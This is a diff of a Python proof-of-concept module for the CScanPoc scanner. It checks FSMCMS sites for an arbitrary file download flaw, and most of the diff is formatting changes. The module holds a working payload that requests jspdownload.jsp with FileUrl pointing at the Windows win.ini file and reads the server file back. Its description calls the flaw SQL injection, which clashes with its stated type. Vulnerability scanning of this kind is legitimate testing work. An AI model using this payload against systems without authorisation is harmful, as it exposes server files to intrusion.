@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'FSMCMS_0003' # 平台漏洞编号，留空
+    vuln_id = 'FSMCMS_0003'  # 平台漏洞编号，留空
     name = 'FSMCMS通用网站集群系统 任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2015-05-26'  # 漏洞公布时间
     desc = '''
         北京东方文辉FSMCMS通用网站集群系统 /fsmcms/cms/web/jspdownload.jsp 配置参数不当，导致SQL注入漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'FSMCMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'ef483047-0e75-4475-87bf-5924b9984b05'
@@ -30,11 +32,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #http://www.wooyun.org/bugs/wooyun-2010-0116270
+
+            # http://www.wooyun.org/bugs/wooyun-2010-0116270
             payload = '/fsmcms/cms/web/jspdownload.jsp?FileUrl=c:%5Cwindows%5Cwin.ini'
             r = requests.get(self.target + payload)
-            if r.status_code == 200 and '[fonts]' in r.content and '[extensions]' in r.content and '[files]' in r.content :
+            if r.status_code == 200 and '[fonts]' in r.content and '[extensions]' in r.content and '[files]' in r.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -43,6 +45,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
